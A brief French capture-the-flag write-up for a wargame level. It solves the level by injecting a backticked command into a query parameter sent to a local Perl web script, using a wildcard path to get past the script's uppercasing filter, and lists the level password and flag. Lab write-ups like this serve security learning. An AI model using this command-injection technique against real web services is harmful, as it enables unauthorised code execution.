# level 12

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
fa6v5ateaw21peobuub8ipe6s
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

On a un fichier perl qui prend 2 paramètre

Osef du 2nd, mais sur le premier il vire les whitespaces puis le CAPS.

Impossible donc de lui envoyer le shell directement, puisqu’il va CAPS le tmp.

CEPENDANT, on peut mettre un wildcard à la place du tmp.
```cmd
nano /tmp/WOW
getflag > /tmp/wow
chmod +x /tmp/WOW
curl 'localhost:4646?x=`/*/WOW`'
```
On cat le résultat `g1qKMiRpXf53AWhDaU7FEkczr`

```cmd
su level13
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
g1qKMiRpXf53AWhDaU7FEkczr
```